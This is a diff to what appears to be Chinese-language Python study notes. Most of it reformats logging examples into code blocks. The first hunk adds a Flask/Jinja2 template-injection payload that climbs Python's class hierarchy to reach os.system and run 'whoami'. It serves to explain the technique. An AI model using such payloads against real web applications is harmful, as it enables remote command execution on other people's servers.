@@ -3413,6 +3413,16 @@ os模块执行命令:
 
 #### {% %}使用
 
+```python
+print(
+    Template('''
+        {% for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == "_wrap_close" %}
+            {{ i.__init__.__globals__['system']('whoami') }} 
+        {% endfor %}
+    ''').render()
+)
+```
+
 {% %}是属于flask的控制语句，且以{% end.. %}结尾，可以通过在控制语句，定义变量或者写循环，判断。
 
 index.html
@@ -4711,51 +4721,58 @@ logger.info("Finish")
 
 主模块mainModule.py，
 
-    import logging
-    import subModule
-    logger = logging.getLogger("mainModule")
-    logger.setLevel(level = logging.INFO)
-    handler = logging.FileHandler("log.txt")
-    handler.setLevel(logging.INFO)
-    formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
-    handler.setFormatter(formatter)
-     
-    console = logging.StreamHandler()
-    console.setLevel(logging.INFO)
-    console.setFormatter(formatter)
-     
-    logger.addHandler(handler)
-    logger.addHandler(console)
+```python
+import logging
+import subModule
+logger = logging.getLogger("mainModule")
+logger.setLevel(level = logging.INFO)
+handler = logging.FileHandler("log.txt")
+handler.setLevel(logging.INFO)
+formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+handler.setFormatter(formatter)
+ 
+console = logging.StreamHandler()
+console.setLevel(logging.INFO)
+console.setFormatter(formatter)
+ 
+logger.addHandler(handler)
+logger.addHandler(console)
+```
 
 
-​     
-​    logger.info("creating an instance of subModule.subModuleClass")
-​    a = subModule.SubModuleClass()
-​    logger.info("calling subModule.subModuleClass.doSomething")
-​    a.doSomething()
-​    logger.info("done with  subModule.subModuleClass.doSomething")
-​    logger.info("calling subModule.some_function")
-​    subModule.som_function()
-​    logger.info("done with subModule.some_function")
+
+
+```python
+logger.info("creating an instance of subModule.subModuleClass")
+a = subModule.SubModuleClass()
+logger.info("calling subModule.subModuleClass.doSomething")
+a.doSomething()
+logger.info("done with  subModule.subModuleClass.doSomething")
+logger.info("calling subModule.some_function")
+subModule.som_function()
+logger.info("done with subModule.some_function")
+```
 
 子模块subModule.py，
 
-    import logging
-     
-    module_logger = logging.getLogger("mainModule.sub")
-    class SubModuleClass(object):
-        def __init__(self):
-            self.logger = logging.getLogger("mainModule.sub.module")
-            self.logger.info("creating an instance in SubModuleClass")
-        def doSomething(self):
-            self.logger.info("do something in SubModule")
-            a = []
-            a.append(1)
-            self.logger.debug("list a = " + str(a))
-            self.logger.info("finish something in SubModuleClass")
-     
-    def som_function():
-        module_logger.info("call function some_function")
+```python
+import logging
+ 
+module_logger = logging.getLogger("mainModule.sub")
+class SubModuleClass(object):
+    def __init__(self):
+        self.logger = logging.getLogger("mainModule.sub.module")
+        self.logger.info("creating an instance in SubModuleClass")
+    def doSomething(self):
+        self.logger.info("do something in SubModule")
+        a = []
+        a.append(1)
+        self.logger.debug("list a = " + str(a))
+        self.logger.info("finish something in SubModuleClass")
+ 
+def som_function():
+    module_logger.info("call function some_function")
+```
 
 执行之后，在控制和日志文件log.txt中输出，
 
